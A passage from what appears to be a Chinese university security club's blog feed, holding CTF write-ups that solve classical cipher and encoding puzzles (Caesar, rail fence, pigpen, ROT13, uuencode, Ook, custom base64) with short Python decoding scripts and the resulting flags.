1 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">y=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 </span></span><br><span class="line"><span class="string">0 1 0 1 0 0</span></span><br><span class="line"><span class="string">0 1 0 1 0 0</span></span><br><span class="line"><span class="string">0 1 0 1 0 0</span></span><br><span class="line"><span class="string">0 1 0 1 0 0</span></span><br><span class="line"><span class="string">0 1 0 1 0 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">d=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 </span></span><br><span class="line"><span class="string">1 1 1 1 1 1</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">1 1 0 0 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 1 1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 1 1 0 0 0 </span></span><br><span class="line"><span class="string">0 1 1 0 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">h=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 </span></span><br><span class="line"><span class="string">0 1 1 1 1 1</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">0 1 1 1 1 1</span></span><br><span class="line"><span class="string">0 0 0 1 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">e=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 </span></span><br><span class="line"><span class="string">1 0 0 0 1 0</span></span><br><span class="line"><span class="string">1 0 0 0 0 0</span></span><br><span class="line"><span class="string">1 0 0 0 0 0</span></span><br><span class="line"><span class="string">1 1 1 1 1 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">i=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 </span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">还有⼏个字⺟的图，找不到啦，反正就是这样</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(m+c+null+i+s+null+a+null+g+o+o+d+null+g+a+m+e)</span><br></pre></td></tr></table></figure><p>flag{mc_is_a_good_game}</p><h2 id="Xiong"><a href="#Xiong" class="headerlink" title="Xiong"></a>Xiong</h2><p> ** 熊曰 ** ，一眼熊语密码，参考<a href="http://hi.pcmoe.net/index.html%E5%A4%8D%E5%88%B6%E8%BF%9B%E5%8E%BB%E8%A7%A3%E5%AF%86%E5%8D%B3%E5%8F%AF%E3%80%82">http://hi.pcmoe.net/index.html复制进去解密即可。</a><br>** 你这石榴啥品种的? **<br>二进制转为十六进制后base16解码接着再栅栏密码解码即可得到flag。</p><h2 id="原？启！"><a href="#原？启！" class="headerlink" title="原？启！"></a>原？启！</h2><p>解压压缩包进⼊发现是 Ook 编码，不知道是啥原因，BugKu的解码是有问题的得不出结果<br><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> 参考该链接进去解码，结果发现有一串 Cipher 和乱序字符串，熟悉base64 的同学应该知道base64 码表为 A-Z a-z 0-9 +&#x2F; 的顺序排列，故可以想到是换表base64加密。从网上或是自己写脚本将更改的码表添加即可解密。</p><h2 id="bassssssssssssssse"><a href="#bassssssssssssssse" class="headerlink" title="bassssssssssssssse"></a>bassssssssssssssse</h2><p>使用<br><a href="https://cyberchef.org/">https://cyberchef.org/</a><br>解码三次即可。</p><h2 id="我的困惑，佛给出了这些解答"><a href="#我的困惑，佛给出了这些解答" class="headerlink" title="我的困惑，佛给出了这些解答"></a>我的困惑，佛给出了这些解答</h2><p>与佛论禅解密即可<br><a href="http://www.atoolbox.net/Tool.php?Id=1027">http://www.atoolbox.net/Tool.php?Id=1027</a></p><h2 id="凯凯凯撒密码码码"><a href="#凯凯凯撒密码码码" class="headerlink" title="凯凯凯撒密码码码"></a>凯凯凯撒密码码码</h2><p>解法</p><ol><li>根据题干，得知是凯撒密码，但是不知道偏移量是多少，所以使用<a href="https://puzz.cipherpuzzles.com/cipher_machine/">在线工具</a>进行暴力破解。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">偏移量密文</span><br><span class="line"> 1 Ifndj_rpc_anjm_ftue_sentence,illh_ib_iwt_gauagain,yv_ayhuzmvytpun_kag_knlxvn_fa_hvs_wjosan.</span><br><span class="line"> 2 Jg_oek_sqd_bokn_guvf_tfoufodf,jmmi_jc_jxu_hbv_bhbjo,zw_bzivanwzuqvo_lbh_lomywo_gb_iwt_xkptbo.</span><br><span class="line"> 3 Kh_pfl_tre_cplo_hvwg_ugpvgpeg,knnj_kd_kyv_icw_cickp,ax_cajwboxavrwp_mci_mpnzxp_hc_jxu_ylqucp.</span><br><span class="line"> 4 Li_qgm_usf_dqmp_iwxh_vhqwhqfh,lookle_lzw_jdx_djdlq,bydbkxcpybwsxq_ndj_nqoayq_id_kyv_zmrvdq.</span><br><span class="line"> 5 Mj_rhn_vtg_ernq_jxyi_wirxirgi,mppl_mf_max_key_ekemr,cz_eclydqzcxtyr_oek_orpbzr_je_lzw_answer.</span><br><span class="line"> 6 Nk_sio_wuh_fsor_kyzj_xjsyjshj,nqqm_ng_nby_lfz_flfns,da_fdmzeradyuzs_pfl_psqcas_kf_max_botxfs.</span><br><span class="line"> 7 Ol_tjp_xvi_gtps_lzak_yktzktik,orrn_oh_ocz_mga_gmgot,eb_genafsbezvat_qgm_qtrdbt_lg_nby_cpuygt.</span><br><span class="line"> 8 Pm_ukq_ywj_huqt_mabl_zlualujl,psso_pi_pda_nhb_hnhpu,fc_hfobgtcfawbu_rhn_rusecu_mh_ocz_dqvzhu.</span><br><span class="line"> 9 Qn_vlr_zxk_ivru_nbcm_amvbmvkm,qttp_qj_qeb_oic_ioiqv,gd_igpchudgbxcv_sio_svtfdv_ni_pda_erwaiv.</span><br><span class="line"> 10 Ro_wms_ayl_jwsv_ocdn_bnwcnwln,ruuq_rk_rfc_pjd_jpjrw,he_jhqdivehcydw_tjp_twugew_oj_qeb_fsxbjw.</span><br><span class="line"> 11 Sp_xnt_bzm_kxtw_pdeo_coxdoxmo,svvr_sl_sgd_qke_kqksx,if_kirejwfidzex_ukq_uxvhfx_pk_rfc_gtyckx.</span><br><span class="line"> 12 Tqyoucanlyux_qefp_dpyepynp,twws_tmthe_rlf_lrlty,jg_ljsfkxgjeafy_vlr_vywigy_ql_sgd_huzdly.</span><br><span class="line"> 13 Ur_zpv_dbo_mzvy_rfgq_eqzfqzoq,uxxt_un_uif_smg_msmuz,kh_mktglyhkfbgz_wms_wzxjhz_rm_the_ivaemz.</span><br><span class="line"> 14 Vs_aqw_ecp_nawz_sghr_fragrapr,vyyu_vo_vjg_tnh_ntnva,li_nluhmzilgcha_xnt_xaykia_sn_uif_jwbfna.</span><br><span class="line"> 15 Wt_brx_fdq_obxathisgsbhsbqs,wzzv_wp_wkh_uoi_ouowb,mj_omvinajmhdibyouybzljb_to_vjg_kxcgob.</span><br><span class="line"> 16 Xu_csy_ger_pcyb_uijt_htcitcrt,xaaw_xq_xli_vpj_pvpxc,nk_pnwjobkniejc_zpv_zcamkc_up_wkh_lydhpc.</span><br><span class="line"> 17 Yv_dtz_hfs_qdzc_vjku_iudjudsu,ybbx_yr_ymj_wqk_qwqyd,ol_qoxkpclojfkd_aqw_adbnld_vq_xli_mzeiqd.</span><br><span class="line"> 18 Zw_eua_igtreadwklv_jvekvetv,zccy_zs_znk_xrl_rxrze,pm_rpylqdmpkgle_brxbecomewr_ymj_nafjre.</span><br><span class="line"> 19 Ax_fvb_jhu_sfbe_xlmw_kwflwfuw,addzataol_ysm_sysaf,qn_sqzmrenqlhmf_csy_cfdpnf_xs_znk_obgksf.</span><br><span class="line"> 20 By_gwc_kiv_tgcf_ymnx_lxgmxgvx,beea_bu_bpm_ztn_tztbg,rotransformingdtz_dgeqog_yt_aol_pchltg.</span><br><span class="line"> 21 Cz_hxd_ljw_uhdg_znoy_myhnyhwy,cffb_cv_cqn_auo_uauch,sp_usbotgpsnjoh_eua_ehfrph_zu_bpm_qdimuh.</span><br><span class="line"> 22 Da_iye_mkx_vieh_aopz_nziozixz,dggc_dw_dro_bvp_vbvdi,tq_vtcpuhqtokpi_fvb_figsqi_av_cqn_rejnvi.</span><br><span class="line"> 23 Eb_jzf_nly_wjfi_bpqa_oajpajya,ehhd_ex_esp_cwq_wcwej,ur_wudqviruplqj_gwc_gjhtrj_bw_dro_sfkowj.</span><br><span class="line"> 24 Fc_kag_omz_xkgj_cqrb_pbkqbkzb,fiie_fy_ftq_dxr_xdxfk,vs_xverwjsvqmrk_hxd_hkiusk_cx_esp_tglpxk.</span><br><span class="line"> 25 Gd_lbh_pna_ylhk_drsc_qclrclac,gjjf_gz_gur_eys_yeygl,wt_ywfsxktwrnsl_iye_iljvtl_dy_ftq_uhmqyl.</span><br><span class="line"> 26 He_mci_qob_zmil_estd_rdmsdmbd,hkkg_ha_hvs_fzt_zfzhm,xu_zxgtyluxsotm_jzf_jmkwum_ez_gur_vinrzm.</span><br></pre></td></tr></table></figure><ol start="2"><li><p>仔细观察，注意加粗部分单词，组合后得到句子。<br>If you can read this sentence, look at the key again, by transforming you become to the answer.<br>翻译⼀下：如果你能读懂这句话，再看一遍密钥，通过转变你会接近答案。</p></li><li><p>根据上⼀步结果，提取密钥（偏移量）：[1, 12, 12, 18, 15, 1, 4, 19, 12, 5, 1, 4, 20, 15, 18, 15, 13, 5]</p></li><li><p>根据题干另一部分可以知道要按照126(题干为16进制)转化为对应的⼩写字⺟az，得到中间答案：[a, l, l, r, o, a, d, s, l, e, a, d, t, o, r, o, m, e]</p></li><li><p>可以看出这是一句谚语，猜测是All roads lead to Rome,再通过后一部分,将特定字⺟按照对应⽅式替换,根据题干的奇怪样子，仿照添加下划线，得到最终的答案<br>flag{@11_20@ds_1e@d_t0_20me}</p></li></ol><h2 id="你知道aCropalypse吗？"><a href="#你知道aCropalypse吗？" class="headerlink" title="你知道aCropalypse吗？"></a>你知道aCropalypse吗？</h2><ol><li><p>搜索acropalypse，找到GitHub上的恢复脚本</p></li><li><p>按照README运行gui.py，得到flag.png（可以通过题干猜出选择为Windows11，按照默认参数也可以得到答案）</p></li><li><p>查看左下角脚本，根据题干分析，写出破解脚本</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text</span>):</span><br><span class="line">    en_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&quot; &quot;</span>:</span><br><span class="line">            en_text += <span class="string">&quot;_&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">            en_text += <span class="string">&quot;@&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&quot;c&quot;</span>:</span><br><span class="line">            en_text += <span class="string">&quot;(&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">            en_text += <span class="string">&quot;$&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&quot;e&quot;</span>:</span><br><span class="line">            en_text += <span class="string">&quot;3&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&quot;o&quot;</span>:</span><br><span class="line">            en_text += <span class="string">&quot;0&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&quot;i&quot;</span>:</span><br><span class="line">            en_text += <span class="string">&quot;!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            en_text += c.upper()</span><br><span class="line">    <span class="keyword">return</span> en_text</span><br><span class="line">text = <span class="string">&quot;now you know acropalypse~&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;%s&#125;&quot;</span> % decrypt(text))</span><br></pre></td></tr></table></figure><p>最后得到flag{N0W_Y0U_KN0W_@(R0P@LYPS3~}</p><p>本次⽐赛圆满结束，感谢⼤家周末两天时间的积极竞赛和不懈努力！国家安全离不开密码技术的发展，密码安全由大家共同守护！</p><pre><code>                                                        ----⽹络空间安全⼤学⽣创新实践基地全体成员敬上</code></pre>]]></content>
      
      
      <categories>
          
          <category> 夺旗赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 密码学 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全基础能力训练-crypto</title>
      <link href="/posts/c3ec.html"/>
      <url>/posts/c3ec.html</url>
      <cover>https://www.freeimg.cn/i/2023/10/29/653e5fd341965.jpg</cover>
      <date>Sat Oct 28 2023 21:15:05 GMT+0000</date>
      
        <content type="html"><![CDATA[<h1 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h1><h2 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h2><p>题⽬描述：</p><p>公元前⼀百年，在罗马出⽣了⼀位对世界影响巨大的人物，他生前是罗马三巨头之⼀。他率先使⽤了⼀种简单的加密函，因此这种加密方法以他的名字命名。</p><p>加密后：FRPHQZSX</p><p>目标：得到明文信息</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>凯撒密码就是将明文信息进行移位；</p></li><li><p>密钥就是1-26作为移位的依据；</p></li><li><p>因为题目并没有给出对应密钥，所以需要遍历密钥空间，将所有可能的明文信息列出来，根据分析得到真正的明文即可；</p></li></ol><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    result_list = []</span><br><span class="line">    ciphertext = ciphertext.lower()</span><br><span class="line">    <span class="comment">#遍历密钥空间[1:26]</span></span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">            <span class="built_in">ascii</span> = <span class="built_in">ord</span>(ciphertext[i]) - number</span><br><span class="line">            <span class="keyword">if</span> <span class="number">97</span> &lt;= <span class="built_in">ascii</span> &lt;= <span class="number">122</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ciphertext[i]) - number)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">ascii</span> = <span class="built_in">ord</span>(ciphertext[i]) + <span class="number">26</span> - number</span><br><span class="line">                result += <span class="built_in">chr</span>(<span class="built_in">ascii</span>)</span><br><span class="line">        result_list.append(result)</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> result_list</span><br><span class="line"><span class="built_in">print</span>(caesar(<span class="string">&quot;FRPHQZSX&quot;</span>))</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>输出26种可能的明文信息列表：</p><p>[‘eqogpyrw’, ‘dpnfoxqv’, ‘comenwpu’, ‘bnldmvot’, ‘amkcluns’, ‘zljbktmr’, ‘ykiajslq’, ‘xjhzirkp’, ‘wigyhqjo’, ‘vhfxgpin’, ‘ugewfohm’, ‘tfdvengl’, ‘secudmfk’, ‘rdbtclej’, ‘qcasbkdi’, ‘pbzrajch’, ‘oayqzibg’, ‘nzxpyhaf’, ‘mywoxgze’, ‘lxvnwfyd’, ‘kwumvexc’, ‘jvtludwb’, ‘iusktcva’, ‘htrjsbuz’, ‘gsqiraty’]</p><p>根据分析，有效的明文信息为flag{comenwpu}；</p><hr><h1 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h1><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><p>题目描述：<br>题目字数分组，密文：fsf5lrdwacloggwqi11l</p><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><h4 id="栅栏密码原理"><a href="#栅栏密码原理" class="headerlink" title="栅栏密码原理"></a>栅栏密码原理</h4><p>加密：</p><p>把将要传递的信息中的字母交替排成上下两行</p><p>例：栏数为2（栏数相当于密钥）</p><p>T E O G S D Y U T A E N N<br>H L N E T A M S H V A E D<br>密文：</p><p>TEOGSDYUTAENN HLNETAMSHVAED</p><p>解密：</p><p>T E O G S D Y U T A E N N<br>H L N E T A M S H V A E D</p><p>明文：</p><p>THE LONGEST DAY MUST HAVE AN END</p><ol><li><p>题目没有提供栅栏栏数，因此不知道应该将密文分为几部分，需要尝试多种栏数；</p></li><li><p>一般会取密文长度的因数作为栏数，本题密文长度为20；</p></li><li><p>先得到密文长度的因数，然后遍历因数列表，将因数作为栏数，把不同结果输出到结果列表中；</p></li><li><p>最终通过对结果的分析得到真正的明文信息即可；</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fence</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="comment">#结果列表</span></span><br><span class="line">    result_list = []</span><br><span class="line">    length = <span class="built_in">len</span>(ciphertext)</span><br><span class="line">    <span class="comment">#创建因数列表</span></span><br><span class="line">    factor_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length):</span><br><span class="line">        <span class="keyword">if</span> length % i == <span class="number">0</span> <span class="keyword">and</span> i &lt; length//<span class="number">2</span>:</span><br><span class="line">            factor_list.append(i)</span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> factor_list:</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length//factor):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(factor):</span><br><span class="line">                result += ciphertext[i]</span><br><span class="line">                i += length//factor</span><br><span class="line">        result_list.append(result)</span><br><span class="line">    <span class="keyword">return</span> result_list</span><br></pre></td></tr></table></figure><h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><p>result_list 输出：</p><p>[‘fsf5lrdwacloggwqi11l’, ‘flsofg5glwrqdiw1a1cl’, ‘frlqsdoifwg15ag1lcwl’, ‘flagisrcg1fdlw15woql’]</p><p>根据分析，’flagisrcg1fdlw15woql’ 为有效信息；</p><hr><h1 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h1><p>题目描述：</p><p>小猪佩奇！</p><p><img src="/img/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E8%83%BD%E5%8A%9B%E8%AE%AD%E7%BB%83/%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81.png" alt="图例"></p><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><h4 id="猪圈密码工作原理"><a href="#猪圈密码工作原理" class="headerlink" title="猪圈密码工作原理"></a>猪圈密码工作原理</h4><p>将字母表中的每个字母分配给特定形状的方括号或“猪圈”。写秘密信息时，不用写字母，而是画出每个字母所在的方括号。</p><ol><li><p>查找到猪圈密码表：</p><p><img src="/img/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E8%83%BD%E5%8A%9B%E8%AE%AD%E7%BB%83/%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81%E8%A1%A8.png" alt="图例"></p></li><li><p>根据密码表，将密文解码即可；</p></li></ol><h2 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h2><p>flag{THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG}</p><hr><h1 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h1><h2 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h2><p>一共踢了 13 脚</p><p>题目描述：</p><p>synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}</p><h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>使用的是ROT-13编码，将明文或密文中的英文字母替换成对应的英文字符即可；</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    ciphertext = ciphertext.lower()</span><br><span class="line">    ciphertext = ciphertext[<span class="number">5</span>:]</span><br><span class="line">    <span class="built_in">print</span>(ciphertext)</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    rot13_begin = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    rot13_end = <span class="string">&#x27;nopqrstuvwxyzabcdefghijklm&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> ciphertext[i] <span class="keyword">in</span> rot13_begin:</span><br><span class="line">            pos = rot13_begin.find(ciphertext[i])</span><br><span class="line">            result += rot13_end[pos]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += ciphertext[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag&#123;&#x27;</span> + result</span><br><span class="line"><span class="built_in">print</span>(rot13(<span class="string">&#x27;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="运行结果-3"><a href="#运行结果-3" class="headerlink" title="运行结果"></a>运行结果</h2><p>flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}</p><hr><h1 id="题目五"><a href="#题目五" class="headerlink" title="题目五"></a>题目五</h1><h2 id="Uuencode"><a href="#Uuencode" class="headerlink" title="Uuencode"></a>Uuencode</h2><p>题⽬描述：</p><p>密文：89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]</p><h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><h4 id="UUE-编码原理"><a href="#UUE-编码原理" class="headerlink" title="UUE 编码原理"></a>UUE 编码原理</h4><p>用3个字节数据列成一组（不足3个字节以零补齐），此24位数据分为4 组，每组6位，再将得到的6位二进制数映射到ASCII码32~95之间的字符；</p><ol><li><p>这种编码方式和base64类似，通过二进制重新分组后转换为对应的ASCII码。本题其实就是这种编码的解码过程；</p></li><li><p>需要注意的是密文中第一个字符，如果第一个字符不为 ’M‘ ，说明需要解码的数据所对应的明文信息不足45个字节，否则说明需要解码的数据不止一行。因为本题密文信息首位为 ’8‘，所以只需要处理破解一行数据即可；</p></li><li><p>将每个字符的 ASCII 值减去32后转换为6为二进制码，添加到 binary 字符串中；</p></li><li><p>将 binary 字串以 8 位为一组转换为 ASCII 码即可；</p></li></ol><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">uue_code</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ciphertext = ciphertext[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="built_in">ascii</span> = <span class="built_in">ord</span>(ciphertext[i]) - <span class="number">32</span></span><br><span class="line">        binary += <span class="string">&#x27;&#123;0:06b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ascii</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>-(<span class="built_in">len</span>(binary) % <span class="number">8</span>)):</span><br><span class="line">            binary += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> cnt &lt; <span class="built_in">len</span>(binary)//<span class="number">8</span>:</span><br><span class="line">        ascii_result = <span class="built_in">int</span>(binary[i: i+<span class="number">8</span>], base=<span class="number">2</span>)</span><br><span class="line">        result += <span class="built_in">chr</span>(ascii_result)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="运行结果-4"><a href="#运行结果-4" class="headerlink" title="运行结果"></a>运行结果</h2><p>flag{dsdasdsa99877LLLKK}</p><hr><h1 id="题目六"><a href="#题目六" class="headerlink" title="题目六"></a>题目六</h1><h2 id="滴答滴答"><a href="#滴答滴答" class="headerlink" title="滴答滴答"></a>滴答滴答</h2><p>题⽬描述：<br>福尔摩斯表</p><p><img src="/img/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E8%83%BD%E5%8A%9B%E8%AE%AD%E7%BB%83/%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF.png" alt="图例"></p><h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>对照摩斯密码表进行解码即可；</p><h2 id="运行结果-5"><a href="#运行结果-5" class="headerlink" 